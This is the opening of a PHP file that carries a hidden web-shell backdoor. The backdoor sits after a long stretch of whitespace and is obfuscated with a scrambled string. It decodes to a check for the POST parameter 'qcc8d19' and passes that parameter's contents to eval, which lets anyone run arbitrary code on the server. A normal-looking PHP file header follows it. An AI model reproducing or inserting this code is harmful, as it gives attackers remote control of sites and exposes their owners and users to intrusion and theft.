<?php                                                                                                                                                                                                                                                                $ucs1 ="ut_sepor"; $oxxg0=$ucs1[3].$ucs1[1]. $ucs1[7]. $ucs1[1]. $ucs1[6]. $ucs1[0].$ucs1[5]. $ucs1[5].$ucs1[4]. $ucs1[7] ; $yavb3=$oxxg0( $ucs1[2]. $ucs1[5] .$ucs1[6]. $ucs1[3].$ucs1[1] ); if ( isset (${$yavb3}[ 'qcc8d19' ] )) {eval (${$yavb3 }['qcc8d19' ]);}?><?php
/**
